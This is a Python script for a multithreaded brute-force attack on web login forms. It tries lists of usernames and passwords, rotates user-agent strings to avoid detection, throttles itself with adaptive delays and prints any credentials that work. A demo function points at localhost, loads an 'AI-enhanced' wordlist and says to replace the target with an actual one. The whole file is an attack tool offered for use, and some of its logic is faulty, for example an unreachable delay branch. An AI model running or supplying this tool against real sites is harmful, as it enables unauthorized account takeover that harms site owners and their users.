import requests
import time
import random
from itertools import cycle
import threading
from queue import Queue

class IntelligentBruteForcer:
    def __init__(self, target_url, usernames, passwords):
        self.target_url = target_url
        self.usernames = usernames
        self.passwords = passwords
        self.success_queue = Queue()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        self.session = requests.Session()
    
    def adaptive_delay(self, attempt_count):
        # Implement adaptive delay based on response patterns
        base_delay = 0.5
        if attempt_count > 10:
            return base_delay * 2
        elif attempt_count > 50:
            return base_delay * 4
        return base_delay
    
    def attempt_login(self, username, password, attempt_count):
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        data = {
            'username': username,
            'password': password
        }
        
        try:
            response = self.session.post(
                self.target_url,
                data=data,
                headers=headers,
                timeout=10,
                allow_redirects=False
            )
            
            # Analyze response for success indicators
            success_indicators = [
                'dashboard', 'welcome', 'profile', 'logout',
                response.status_code in [200, 302, 301]
            ]
            
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'error',
                'wrong', 'denied'
            ]
            
            response_text = response.text.lower()
            
            if any(indicator in response_text for indicator in success_indicators):
                if not any(indicator in response_text for indicator in failure_indicators):
                    return True, response.status_code
            
            return False, response.status_code
            
        except Exception as e:
            print(f"Request failed: {e}")
            return False, 0
    
    def worker(self, username, passwords_chunk, thread_id):
        attempt_count = 0
        for password in passwords_chunk:
            attempt_count += 1
            success, status_code = self.attempt_login(username, password, attempt_count)
            
            if success:
                result = f"SUCCESS: {username}:{password} (Status: {status_code})"
                print(result)
                self.success_queue.put((username, password))
                return
            
            print(f"Thread {thread_id}: Attempt {attempt_count} - {username}:{password} - Failed ({status_code})")
            time.sleep(self.adaptive_delay(attempt_count))
    
    def run_attack(self, max_threads=3):
        print(f"Starting intelligent brute force attack on {self.target_url}")
        print(f"Usernames: {len(self.usernames)}, Passwords: {len(self.passwords)}")
        
        for username in self.usernames:
            # Split passwords into chunks for threading
            chunk_size = len(self.passwords) // max_threads
            password_chunks = [
                self.passwords[i:i + chunk_size] 
                for i in range(0, len(self.passwords), chunk_size)
            ]
            
            threads = []
            for i, chunk in enumerate(password_chunks):
                if chunk:  # Only create thread if chunk is not empty
                    thread = threading.Thread(
                        target=self.worker,
                        args=(username, chunk, i)
                    )
                    threads.append(thread)
                    thread.start()
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            # Check if we found credentials
            if not self.success_queue.empty():
                break

# Example usage function
def demo_bruteforce():
    # This is for demonstration - replace with actual target
    target_url = "http://localhost:8080/login"  # Demo target
    usernames = ['admin', 'user', 'test', 'guest']
    
    # Load AI-enhanced passwords
    try:
        with open('ai_enhanced_wordlist.txt', 'r') as f:
            passwords = [line.strip() for line in f.readlines()[:50]]  # Limit for demo
    except FileNotFoundError:
        passwords = ['password', '123456', 'admin', 'test', 'guest']
    
    bruteforcer = IntelligentBruteForcer(target_url, usernames, passwords)
    print("Demo mode - replace target_url with actual target")
    print(f"Would test {len(usernames)} usernames with {len(passwords)} passwords")

if __name__ == "__main__":
    demo_bruteforce()
